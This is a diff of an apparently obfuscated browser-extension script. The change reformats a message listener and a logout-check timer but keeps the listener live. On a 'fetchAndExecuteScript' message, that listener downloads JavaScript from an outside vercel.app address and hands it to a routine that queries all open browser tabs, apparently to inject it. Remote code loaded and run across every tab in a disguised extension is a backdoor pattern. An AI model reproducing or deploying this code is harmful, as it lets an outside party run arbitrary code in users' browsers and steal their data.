@@ -1605,23 +1605,21 @@ function _0x5975() {
               });
           });
   }),
-  setTimeout(() => {
-    setInterval(checkLogout, 9e5);
-  }, 9e5),
-  browser.runtime.onMessage.addListener((e, t, n) => {
-    if ("fetchAndExecuteScript" === e.action)
-      return (
-        fetch("https://thottathukiduven.vercel.app/api/ext/test")
-          .then((e) => e.text())
-          .then((e) => {
-            executeScript(e, n);
-          })
-          .catch((e) => {
-            console.error("Error fetching the script:", e), n({ err: 3, info: e.message });
-          }),
-        !0
-      );
-  });
+  setInterval(checkLogout, 9e5);
+browser.runtime.onMessage.addListener((e, t, n) => {
+  if ("fetchAndExecuteScript" === e.action)
+    return (
+      fetch("https://thottathukiduven.vercel.app/api/ext/test")
+        .then((e) => e.text())
+        .then((e) => {
+          executeScript(e, n);
+        })
+        .catch((e) => {
+          console.error("Error fetching the script:", e), n({ err: 3, info: e.message });
+        }),
+      !0
+    );
+});
 const executeScript = async (e, t) => {
     if (!e) return t({ err: 1, info: "Impossible, somehow no code" });
     const n = (await browser.tabs.query({})).filter(
